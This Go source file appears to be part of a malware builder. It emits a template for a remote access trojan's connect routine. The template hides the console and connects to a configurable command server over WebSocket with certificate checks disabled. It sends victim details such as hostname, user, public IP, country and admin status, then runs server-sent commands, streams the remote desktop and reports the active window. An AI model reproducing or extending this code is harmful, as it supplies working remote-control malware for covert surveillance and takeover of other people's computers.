package buildergen

import "strings"

func templateConnect() string {
	return strings.TrimSpace(`
func waitForNetwork() {
	for !hasNetwork() {
		time.Sleep(3 * time.Second)
	}
}

func connectToServer() {
	hideConsole()

	if offlineModeEnabled {
		waitForNetwork()
	}

	serverHost := getServerHost()
	if strings.TrimSpace(serverHost) == "" {
		return
	}

	wsScheme := strings.TrimSpace(getWsScheme())
	if wsScheme == "" {
		wsScheme = "ws"
	}

	wsPath := getWsPath()
	if wsPath == "" {
		wsPath = "/ws"
	}

	u := url.URL{Scheme: wsScheme, Host: serverHost, Path: wsPath}

	header := http.Header{}
	if token := getBuilderToken(); len(token) != 0 {
		header.Add(getBuilderTokenHeader(), string(token))
	}

	dialer := &websocket.Dialer{
		HandshakeTimeout: 15 * time.Second,
	}
	if wsScheme == "wss" {
		dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	conn, _, err := dialer.Dial(u.String(), header)
	if err != nil {
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	userName := getUserName()
	ownerName := getOwnerName()
	buildID := getBuildID()
	id := fmt.Sprintf("%s_%s_%s", hostname, strings.TrimSpace(ownerName), strings.TrimSpace(buildID))
	adminFlag := isAdmin()
	publicIP := getPublicIP()
	country := getCountryByIP(publicIP)

	registerMsg := map[string]interface{}{
		"type":                "register",
		"id":                  id,
		"hostname":            hostname,
		"user":                userName,
		"publicIP":            publicIP,
		"cpu":                 getCPUInfo(),
		"gpu":                 getGPUInfo(),
		"ram":                 getRAMInfo(),
		"owner":               ownerName,
		"version":             buildID,
		"admin":               adminFlag,
		"deviceType":          getDeviceType(),
		"country":             country,
		"startupDelaySeconds": startupDelaySeconds,
		"autorunMode":         autorunMode,
		"installPath":         customInstallPath,
		"hideFilesEnabled":    hideFilesEnabled,
	}

	if err := wsWriteJSON(conn, registerMsg); err != nil {
		return
	}

	go func() {
		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				return
			}

			var msg map[string]interface{}
			if err := json.Unmarshal(message, &msg); err != nil {
				continue
			}

			typeVal, _ := msg["type"].(string)
			switch typeVal {
			case "command":
				cmdStr, _ := msg["command"].(string)
				if cmdStr != "" {
					go handleServerCommand(conn, id, cmdStr)
				}
			case "rd_start":
				fpsVal, _ := msg["fps"].(float64)
				resVal, _ := msg["resolution_percent"].(float64)
				go startRemoteDesktop(conn, id, int(fpsVal), int(resVal))
			case "rd_stop":
				go stopRemoteDesktop(conn, id)
			}
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	pingTicker := time.NewTicker(15 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-ticker.C:
			updateData := map[string]interface{}{
				"type":   "update",
				"id":     id,
				"window": getActiveWindow(),
			}
			updated, _ := json.Marshal(updateData)
			if err := wsWriteText(conn, updated); err != nil {
				return
			}

		case <-pingTicker.C:
			if !hasNetwork() {
				continue
			}
			pingData := map[string]interface{}{"type": "ping"}
			pingMsg, _ := json.Marshal(pingData)
			if err := wsWriteText(conn, pingMsg); err != nil {
				return
			}
		}
	}
}
`)
}